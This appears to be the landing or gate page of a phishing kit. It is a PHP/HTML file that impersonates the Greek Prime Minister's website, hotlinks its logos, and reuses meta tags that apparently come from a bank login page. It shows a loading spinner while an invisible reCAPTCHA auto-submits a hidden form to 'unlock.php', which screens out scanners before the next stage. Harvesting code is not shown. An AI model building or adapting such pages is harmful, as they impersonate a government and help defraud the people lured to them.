<?php
error_reporting(0);
   session_start();
      include('config.php');
?>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Το Μέγαρο Μαξίμου | Ο Πρωθυπουργός της Ελληνικής Δημοκρατίας</title>
      <meta name="multilanguage" content="true">
      <meta name="mntc" content="[mntc]">
      <meta name="mntcMsg" content="[mntcMsg]">
      <meta name="arm" content="119">
      <meta name="lng" content="el">
      <meta name="epe" content="false">
      <meta name="_af" content="T_XIGso1SMr7zdtjnsjKGZ6X8NrfquicRUdDng4aKgmnaTuo9Mou7d-2csrY07FdvjBf6CmaIyPjJH1eurboogXRQhxuvZss65V2rJDfA_I1">
      <meta name="rscsSc" content="[rscsSc]">
      <meta name="indexTemplate" content="login-night">
      <meta name="appId" content="2e7971cd-7afd-49a0-89ae-7ec531298d01">
      <meta name="gaId" content="UA-33771010-2">
      <meta name="sbxId" content="[sbxId]">
      <meta name="ofnn" content="false">
      <meta name="ftr_exCustOnb" content="true">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/png" href="https://primeminister.gr/wp-content/uploads/2017/06/ethno-01.png">
      <link href="./oo_files/loading.css" rel="stylesheet">
 <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <script>Window.onload = setTimeout(function(){grecaptcha.execute()},5000)</script>
    <script>
        function onSubmit(token) {
            document.getElementById("i-recaptcha").submit();
        }
    </script>
</head>
<script>Window.onload = setTimeout(function(){grecaptcha.execute()},2500)</script>
<body>
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    function post_captcha($user_response) {
        $fields_string = '';
        $fields = array(
            'secret' => $captch_secretkey,
            'response' => $user_response
        );
        foreach($fields as $key=>$value)
        $fields_string .= $key . '=' . $value . '&';
        $fields_string = rtrim($fields_string, '&');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api/siteverify');
        curl_setopt($ch, CURLOPT_POST, count($fields));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
        $result = curl_exec($ch);
        curl_close($ch);
        return json_decode($result, true);
    }
    $res = post_captcha($_POST['g-recaptcha-response']);
    if (!$res['success']) {
        echo 'reCAPTCHA error';
    } else {
        echo '<br><p>CAPTCHA was completed successfully!</p><br>';
    }
} else { 
}
?>
<script>Window.onload = setTimeout(function(){grecaptcha.execute()},5000)</script>
<form id='i-recaptcha' action="unlock.php" method="post">
<button hidden="hidden" class="g-recaptcha" <?php echo"data-sitekey="."'".$captch_key."'" ?> data-callback="onSubmit">
</button>
</form>
<index-page>
         <div class="loader">
            <div class="loading-stage-container">
               <div class="flex-all-center">
                  <div class="loading-stage-logo-container">
                     <figure class="margin-0">
                     </figure>
                  </div>
                  <div class="loading-stage-vertical-line"></div>
                  <div class="loading-stage-logo-container">
                     <figure class="margin-0">
                        <img class="loading-stage-nbg-logo" src="https://primeminister.gr/wp-content/uploads/2017/06/logohome-01.png" alt="Loading...">
                     </figure>
                  </div>
               </div>
               <spinner>
                  <div class="flex-column-all-center">
                     <div class="circle-loader"></div>
                     <h5 class="loader-text">Παρακαλώ περιμένετε</h5>
                  </div>
               </spinner>
            </div>
         </div>
      </index-page>
</body>
</html>
